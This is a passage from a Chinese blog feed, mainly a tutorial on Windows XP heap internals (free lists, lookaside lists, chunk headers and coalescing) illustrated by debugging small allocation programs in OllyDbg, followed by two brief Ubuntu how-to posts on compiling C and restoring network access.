free[0]反向查找最后一个块（即表中最大块），看能否满足要求，如果能满足要求，再正向搜索最小能够满足要求的空闲堆块进行分配。</li></ul><h4 id="堆块释放"><a class="markdownIt-Anchor" href="#堆块释放"></a> 堆块释放</h4><p>释放堆块的操作包括将堆块状态改为空闲，链入相应的堆表。所有的释放块都链入<code>堆表的末尾</code>，分配的时候也先从堆表末尾拿。<code>快表最多只有4项</code></p><h4 id="堆块合并"><a class="markdownIt-Anchor" href="#堆块合并"></a> 堆块合并</h4><p>条件：当堆管理系统发现两个空闲堆块彼此相邻的时候，就会进行堆块合并操作。</p><p><code>堆块合并</code>将两个块从空闲链表中 “卸下”、合并堆块、调整合并后大块的块首信息（如大小等）、将新块重新链入空闲链表。</p><h3 id="堆块"><a class="markdownIt-Anchor" href="#堆块"></a> 堆块</h3><p>根据堆块是否被占用分为<code>占用态</code>堆块和<code>空闲态</code>堆块。</p><p><code>占用态</code>堆块的数据结构如下：<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/763744-20211109201041134-343961699-16505221641986.png" alt="img-占用态堆块"></p><p><code>空闲态</code>堆块的数据结构如下：</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/763744-20211109200833202-1162551076-16505221641987.png" alt="img-空闲态堆块"></p><p>对比上面两图可知，空闲态堆块和占用态堆块的块首结构基本一致。相对于占用态的堆块来说，空闲态堆块的块首后8个字节存放了两个指针地址，分别指向前驱堆块和后驱堆块。</p><p>Self Size：块整体的大小，包括块首和块身</p><p>Previous chunk size：前一个块的大小</p><p>Segment Index：段索引</p><p>Flags：标志位，用于标志块的状态，即空闲态/占用态</p><p>Unused bytes：未被使用的字节大小</p><p>Tag index(Debug)：</p><p>Flink in freelist：（<strong>F</strong>orward <strong>Link</strong>）指向下一个节点</p><p>Blink in freelist：（<strong>B</strong>ackward <strong>Link</strong>）指向前一个节点</p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/singly-and-doubly-linked-lists">单链表和双链表</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry">LIST_ENTRY 结构 (ntdef.h)</a></p><h1 id="在堆中漫游"><a class="markdownIt-Anchor" href="#在堆中漫游"></a> 在堆中漫游</h1><h2 id="堆分配函数之间的调用关系"><a class="markdownIt-Anchor" href="#堆分配函数之间的调用关系"></a> 堆分配函数之间的调用关系</h2><p>Windows 堆分配的 API 调用关系</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409211555625-16505221641988.png" alt="img-Windows 堆分配的 API 调用关系"></p><p>所有的堆分配函数最终都将使用位于 ntdll.dll 中的 RtlAllocateHeap() 函数进行分配。</p><h2 id="堆的调试方法"><a class="markdownIt-Anchor" href="#堆的调试方法"></a> 堆的调试方法</h2><table><thead><tr><th></th><th>实验环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>windows xp sp3虚拟机</td><td>分配策略对操作系统很敏感</td></tr><tr><td>编译器</td><td>Visrual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>如果使用 debug 版本，实验将会失败</td></tr></tbody></table><h3 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);<span class="comment">//Create a heap of specified size</span></span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//free block and prevent coaleses</span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line"></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：_asm int 3 是中断指令，用来中断程序，因为如果直接加载程序到 Ollydbg ，程序将使用调试态堆管理策略，而调试态堆管理策略和常态堆管理策略有很大不同：<br>（1）调试堆不使用快表，只用空表分配。<br>（2）所有堆块都被加上了多余的 16 字节尾部用来防止溢出（防止程序溢出而不是堆溢出攻击），这包括 8 个字节的 0xAB 和 8 个字节的 0x00。<br>（3）块首的标志位不同。</p><h3 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h3><p>在调试前我们先将我们的调试工具 Ollydbg 设为默认调试器</p><ol><li>首先以管理员身份打开 Ollydbg</li><li>在菜单栏下找到 选项 --&gt; 选项</li></ol><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409213629819-16505221641989.png" alt="img-2"></p><ol start="3"><li>在选项的菜单栏中找到<code>杂项</code>，勾选<code>将这份x64dbg设为即时调试器</code>，然后保存</li></ol><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409213958164-165052216419811.png" alt="img-3"></p><p>设置完成后，直接进入vc++6.0，编译成功后，我们直接双击运行，如下</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409214641325-165052216419810.png" alt="image-断点"></p><p>单击 “否” ，将自动打开 Ollydbg 并附加上进程，并在断点处停下来。<br>根据源码可知，中断是发生在<code>HeapCreate</code>函数执行完成后的，<code>HeapCreate</code>执行后会返回堆地址，结果保存在<code>eax</code>中，我们在调试器发现eax值是：<code>0x003A0000</code></p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409215907248-165052216419812.png" alt="image-断点处"></p><p>也就是说<code>HeapCreate</code>创建的堆区起始位置在<code>003A0000</code>，即堆表从此位置开始，堆表中依次为<code>段表索引（Segment List）</code>、<code>虚表索引(Virtual Allocation list)</code>、<code>空表使用标识（freelist usage bitmap）</code>和<code>空表索引区</code>。</p><p>此处我们只关心堆<strong>偏移<code>0x178</code></strong> 处的<strong>空表索引区</strong>，这个偏移<strong>是堆表起始的位置</strong>（根据上次我们介绍的堆表结构，堆表包含128的8个字节的<code>flink</code>和<code>blink</code>地址。所以<strong>堆表的结束位置</strong>在：128*8=1024=0x400,加上偏移，0x178+0x400=<strong>0x578</strong>）</p><p>加上堆基址<code>0x003A0000</code>+<code>0x178</code>=<code>0x003A0178</code>，单击内存1，在内存1中按<code>ctrl+G</code>，输入刚刚计算出的地址，回车，我们来到了这个地址。<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409222324238-165052216419813.png" alt="image-内存1"><br>如图，这个地址便是free[0]，占8个字节，<code>flink</code>和<code>blink</code>都指向尾块的地址，都是<code>0x003a0688</code>。后面的依次是free[1]、free[2]，依次类推，我们发现free[1]、free[2]…free[127]都指向自身，它们都是空链表。</p><blockquote><p>所以当一个堆刚刚被初始化时，只包含一个空闲态的大块，这个块也叫为&quot;尾块&quot; free[0]指向这个&quot;尾块&quot;</p></blockquote><p>我们转到&quot;尾块&quot;的位置去看看（因为这里只有一个堆块，即free[0]指向的地址，free[0]=<code>0x003a0688</code>）<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409222035349-165052216419814.png" alt="image-尾块"></p><p>空闲态的堆块有8个字节的 flink（指向前驱节点） 与 blink（指向后继节点），此处的值均为<code>0x003a0178</code>，这个地址是堆表 free[0] 的地址，实验与理论相符。</p><p>实际上，HeapAlloc() 返回的堆地址是指向<code>块身</code>的。在其前面还有8个字节的<code>块首</code>，所以这个堆块起始于<code>0x003a0680</code>。前2个字节为块大小，此处值是<code>0x130</code>, 堆的计算单位是8字节，也就是<code>0x980</code>字节。</p><blockquote><p>注意：堆大小包含块首在内。</p></blockquote><h3 id="堆块分配-2"><a class="markdownIt-Anchor" href="#堆块分配-2"></a> 堆块分配</h3><p>堆块要点总结：</p><ul><li>堆块的大小包括了块首在内，即如果请求32字节，实际会分配的堆块为40字节：8字节块首＋32字节块身；</li><li>堆块的单位是8字节，不足8字节的部分按8字节分配；</li><li>初始状态下，快表和空表都为空，不存在精确分配。请求将使用 “次优块” 进行分配（这个“次优块”就是位于偏移 <code>0x0688</code> 处的尾块，见上一节最后一张图）</li><li>由于次优分配的发生，分配函数会陆续从尾块中切走一些小块，并修改尾块块首中的 size 信息，最后把 freelist[0] 指向新的尾块位置。</li></ul><p>内存请求分配情况</p><table><thead><tr><th style="text-align:center">堆句柄</th><th style="text-align:center">请求字节数</th><th style="text-align:center">实际分配（堆单位）</th><th style="text-align:center">实际分配（字节）</th></tr></thead><tbody><tr><td style="text-align:center">h1</td><td style="text-align:center">3</td><td style="text-align:center">2</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">h2</td><td style="text-align:center">5</td><td style="text-align:center">2</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">h3</td><td style="text-align:center">6</td><td style="text-align:center">2</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">h4</td><td style="text-align:center">8</td><td style="text-align:center">2</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">h5</td><td style="text-align:center">19</td><td style="text-align:center">4</td><td style="text-align:center">32</td></tr><tr><td style="text-align:center">h6</td><td style="text-align:center">24</td><td style="text-align:center">4</td><td style="text-align:center">32</td></tr></tbody></table><p>在调试器中，我们单步走过第一个<code>HeapAlloc</code>，然后观察内存空间。</p><blockquote><p>tips: 对于我们主动设置的int 3指令，如果调试器忽略异常后仍无法步过的话，可以在下一行代码处右键，选择 “此处设为新的eip”。</p></blockquote><p>按上面的分析，执行完<code>h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3);</code>后，会从<code>0x3a0680</code>地址开始切出一块大小为2个单位（16字节）的空间分配给h1, 新的尾块起始地址则为<code>0x003a0690</code>，flink与blink地址位于<code>0x003a0698</code>和<code>0x003a069c</code>,其值<code>0x003a0178</code>指向<code>freelist[0]</code>, <code>freelist[0]</code>则指向新的起始地址<code>0x003a0698</code>，(<code>003a0690+8</code>字节的块首，我们上面有提到过指向块身。)</p><p>尾块起始处，如下图，如我们所预期的一样<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409225639561-165052216419815.png" alt="img-尾块1"></p><p>另外，尾块的大小为<code>0x12e</code>【0x130-2=0x12e个单位（堆的单位，8个字节）】，如上图，也可以验证。<br>h1所指向的堆块起始位置则是<code>0x003a0680</code>，如上图可知，大小为2个单位</p><p>堆表 freelist[0] 处，如下图，如我们所预期的一样<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409230535578-165052216419816.png" alt="image-freelist[0]"></p><p>接着，执行<code>h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 5);</code> ，将会从尾块中再切一块大小为2个单位（16字节）的空间给h2，然后freelist[0]指向新的尾块起始地址，新的尾块指针仍指向 freelist[0]，剩下的尾块大小为<code>12e-2=12c</code>个单位。</p><p>剩下的依次类推，当执行完<code>h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24);</code>后，堆分配情况如下图所示<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409231557916-165052216419817.png" alt="image-分配完"></p><p>剩下的堆大小为 <code>130-2-2-2-2-4-4=120</code>单位，尾块仍指向 freelist[0]（<code>0x003a0178</code>），如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410002226029-165052216419818.png" alt="image-块尾"></p><p>到此，堆的分配则执行完了。根据上面的理论可知，堆表中仍只有一个尾块，不存在其它的堆块。</p><h3 id="堆块释放-2"><a class="markdownIt-Anchor" href="#堆块释放-2"></a> 堆块释放</h3><p>由于前三次释放的堆块在内存中不连续，因此不会发生合并。按照其大小， h1 和 h3 为16字节，则被链入 freelist[2]， h5 为 32字节，则被链入 freelist[4]。</p><p>当执行<code>HeapFree(hp, 0, h1)</code>后，h1 会被链入 freelist[2]，所以我们来看看 freelist[2] 的地址；<br>由于 freelist[0] 的地址为<code>0x003a0178</code>，所以 freelist[2] 的地址为<code>0x003a0188（=0x003a0178 + 2*0x8）</code></p><p>执行前，如下图。freelist[2] 指向自己，还是空表<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410003750233-165052216419919.png" alt="img-freelist[0]执行前"></p><p>执行后，根据链表规则freelist[2]会指向h1的地址，如下图，h1则会指向freelist[2]<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410004537472-165052216419920.png" alt="image-freelist[2]，执行后"></p><p>执行后，原来h1所指向的堆块变为空闲态并指向 freelist[2]。如下图，flink与blink都指向freelist[2]，因为此时freelist[2]链表中就只有一个节点<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410005451386-165052216419921.png" alt="image-h1，执行后"></p><p>接着会释放h3，执行<code>HeapFree(hp, 0, h3)</code>，执行完后，h3所指向的堆块会被链入到freelist[2]，并插入到整个链表的末尾。</p><p>如下图所示，h3 的 blink（地址0x003a06ac）指向前一个堆块，即原来的h1。h3的flink则指向freelist[2]，因为它是最后一个元素。原来的h1的blink指向freelist[2]，flink指向h3<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410011617319-165052216419922.png" alt="image-h3"></p><p>执行后的freelist[2]（<code>0x003a0188</code>），如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410010737681-165052216419923.png" alt="image-freelist[2]执行后"></p><p>形成的链表大概如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">freelist[2] &lt;---&gt; h1 &lt;---&gt; h3</span><br></pre></td></tr></table></figure><blockquote><p>**注：**h3的flink与freelist[2]的blink未给出。</p></blockquote><p>再下一步，执行<code>HeapFree(hp, 0, h5);</code>，释放h5所在的堆块，并链入freelist[4]</p><h3 id="堆块合并-2"><a class="markdownIt-Anchor" href="#堆块合并-2"></a> 堆块合并</h3><p>条件：释放两个相邻的空闲块会发生堆块合并操作</p><p>步骤：</p><ol><li>进行第四步RtlFreeHeap()，释放 h4 后，进行堆块合并</li><li>首先将从空表中摘下 h3,h4,h5 三个空闲块</li><li>然后重新计算合并后新堆块的大小，<code>2+2+4=8</code>(堆单位：8字节)</li><li>最后按照合并后的大小，把新块连入链表 freelist[8]</li></ol><p>我们来看看 freelist[8]（<code>0x003a01b8</code>），如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410110935922-165052216419924.png" alt="image-freelist[8]"><br>可以看到，<code>0x003a06a8</code>已经被链入freelist[8]中了，<br>freelist[2]（<code>003a0188</code>)中也只剩下 h1（<code>003a0688</code>)，因为 h3 在合并时被摘下了，<br>freelist[4]（<code>00ea0198</code>)也指向自身了，因为 h5 在合并时也被摘下来了</p><p>进入<code>0x003a06a8</code>，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410112022799-165052216419925.png" alt="image-0x003a06a8"><br>可以看到，合并只修改了块首的数据，原来的块身基本不变，大小变成了<code>0x0008</code>，空表指针指向<code>0x003a01b8</code>（就是freelist[8])</p><blockquote><p>注意：</p><ul><li>堆块合并只发生在空表中<br>因为堆块合并要修改多处指针，比较耗时，所以在强调分配效率的快表中，禁止堆块合并</li><li>空表中的第一个块不会向前合并，最后一个不会向后合并</li></ul></blockquote><h3 id="快表的使用"><a class="markdownIt-Anchor" href="#快表的使用"></a> 快表的使用</h3><table><thead><tr><th></th><th>实验环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>windows xp sp3虚拟机</td><td>分配策略对操作系统很敏感</td></tr><tr><td>编译器</td><td>Visrual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>如果使用 debug 版本，实验将会失败</td></tr></tbody></table><h4 id="实验代码-2"><a class="markdownIt-Anchor" href="#实验代码-2"></a> 实验代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1,h2,h3,h4;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>, <span class="number">0</span>,<span class="number">0</span>); <span class="comment">//Create a heap of dynamically assigned</span></span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h1);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h2);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h3);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h4);</span><br><span class="line">    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意：</strong></p><p>​使用快表后，堆结构会发生变化，最主要的变化是 “尾块” 不在位于堆 0x0688 偏移处了，这个位置被快表霸占。</p></blockquote><h4 id="调试-2"><a class="markdownIt-Anchor" href="#调试-2"></a> 调试</h4><p>我们先来看看空表索引区发生了哪些变化，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410134129670-165052216419926.png" alt="image-空表索引区"><br>可以看到，在<code>0x003a0178</code>处变为了<code>003a1ee8</code>，不再是<code>0x003a0688</code></p><p>现在我们来看看快表（<code>0x003a0688</code>），在偏移 <code>ox0688</code>处，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410134256430-165052216419927.png" alt="image-快表"><br>可以看到，堆刚初始化，快表是空的</p><p>然后我们将将代码调试到，释放完 h4之后，如下图所示<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410134354214-165052216419928.png" alt="image-代码"></p><p>根据四个堆块大小我们可以知道，h1,h2 将会被插入到 Lookaside[1]中，h3 会被插入到 Lookaside[2]中，h4会被插入到 Lookaside[4]中，快表区状态，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410134512823-165052216419929.png" alt="image-快表"><br>可以看到，<code>003a1ea0</code>是 8字节堆块地址，<code>003a1eb0</code>是16字节堆地址，<code>003a1ec8</code>是24字节堆地址</p><p>进入<code>003a1ea0</code>，来看看堆块状态，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410135353770-165052216419930.png" alt="image-003a1ea0"><br>紫色框的为下一堆块指针，红色框为堆块状态，<code>ox01</code>表示是 Busy 状态<br>块首只存指向下一堆块的指针，不存再指向前一堆块的指针。</p><p>接着申请 16 字节的空间，系统会从 Lookaside[2]中卸载一个堆块分配给程序，同时修改 Lookaside[2] 表头，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410140303715-165052216419931.png" alt="image-lookaside[2]"></p><p>可以看到，Lookaside[2]（<code>0x003a0718</code>)处变为空了。</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><ul><li>堆的数据结构： <code>堆块</code>、<code>堆表</code></li><li>堆块：包含<code>块首</code>、<code>块身</code></li><li><code>堆表</code>：<code>空闲双向链表（freelist）</code>、<code>快速单向链表(lookaside)</code></li><li>占用态的堆块：<code>8字节的块首+块身</code></li><li>空闲态的堆块：<code>16字节的块首（多了flink与blink）+块身</code>。空闲态的堆块变为占用态时，flink与blink所在的空间将变为data区。</li></ul><hr><blockquote><p>参考：</p><ul><li><p>《0day,软件安全漏洞分析技术》</p></li><li><p><a href="https://www.cnblogs.com/Hslim/p/15530690.html#14-%E6%80%BB%E7%BB%93">《深入分析 win32 堆结构与管理策略》</a></p></li></ul></blockquote><hr><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>“杂乱” 是指堆区经过反复的申请、释放操作之后，原本大片连续的空闲内存区可能 呈现出大小不等且空闲块、占用块相间隔的凌乱状态。 <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p>“辨别” 是指堆管理程序必须能够正确地识别哪些内存区域是正在被程序使用的占用块，哪些区域是可以返回给当前请求的空闲块。 <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p>“恰当” 是指堆管理程序必须能够比较“经济”地分配空闲内存块。如果用户申请使用 8 个字节，而返回给用户一片 512 字节的连续内存区域并将其标记成占用状态，这将造成大量的内存浪费，以致出现明明有内存却无法满足申请请求的情况。 <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p>”占用态” 是指已经被分配给用户程序的内存 <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p>“空闲态” 是指未被分配给用户程序的内存 <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p>&quot;次优分配“ 发生时，会先从大块中按请求的大小精确地“割”出一块进行分配，然后给剩下的部分重新标注块首，链入空表。 <a href="#fnref6" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PS：如果您熟悉堆的工作原理，建议您跳过堆的介绍部分，直接看堆溢出原理&lt;/p&gt;
&lt;h1 id=&quot;堆的工作原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#堆的工作原理&quot;&gt;&lt;/a&gt; 堆的工作原理&lt;/h1&gt;
&lt;h2 id=&quot;堆与栈的区别&quot;&gt;&lt;a c</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="堆" scheme="https://www.rgzzplus.com/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu命令行编C语言</title>
    <link href="https://www.rgzzplus.com/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/"/>
    <id>https://www.rgzzplus.com/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/</id>
    <published>2022-03-29T14:58:54.000Z</published>
    <updated>2022-03-29T15:14:04.187Z</updated>
    
    <content type="html"><![CDATA[<p>首先在文本编辑器中编写C代码，并将名字保存为hello.c</p><p><img src="/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/image-20220329230050502.png" alt="hello.c"></p><p>在<code>terminal</code>中打开<code>Documents</code>（因为我的hello.c保存在Documents中）</p><p><code>terminal</code>中输入：<code>cc hello.c</code> 编译hello.c</p><p>执行文件 ：<code>./a.out</code> （在Documents中生成可执行文件，同时也会输出)</p><p><img src="/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/image-20220329231023881.png" alt="terminal"></p><p><a href="https://blog.csdn.net/lanyandong/article/details/80670870">详情链接</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先在文本编辑器中编写C代码，并将名字保存为hello.c&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/image-2022032923</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="ubuntu" scheme="https://www.rgzzplus.com/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu 20.04突然无法联网</title>
    <link href="https://www.rgzzplus.com/2022/03/29/ubuntu-20-04%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/"/>
    <id>https://www.rgzzplus.com/2022/03/29/ubuntu-20-04%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/</id>
    <published>2022-03-29T14:53:05.000Z</published>
    <updated>2022-03-29T14:57:06.567Z</updated>
    
    <content type="html"><![CDATA[<p>解决方法：</p><p>在 <code>terminal</code> 下执行如下指令：</p><p>ping <a href="http://www.baidu.com">www.baidu.com</a><br>sudo service network-manager stop<br>sudo rm /var/lib/NetworkManager/NetworkManager.state<br>sudo service network-manager start</p><p>ping <a href="http://www.baidu.com">www.baidu.com</a></p><p>之后显示下图表示连接成功。按 <code>Ctrl+C</code> 即可停止。</p><p><img src="/2022/03/29/ubuntu-20-04%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/image-20220329225535100.png" alt="ping后"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;解决方法：&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;terminal&lt;/code&gt; 下执行如下指令：&lt;/p&gt;
&lt;p&gt;ping &lt;a href=&quot;http://www.baidu.com&quot;&gt;www.baidu.com&lt;/a&gt;&lt;br&gt;
sudo service network-manag</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="ubuntu" scheme="https://www.rgzzplus.com/tags/ubuntu/"/>
    
  </entry>
  
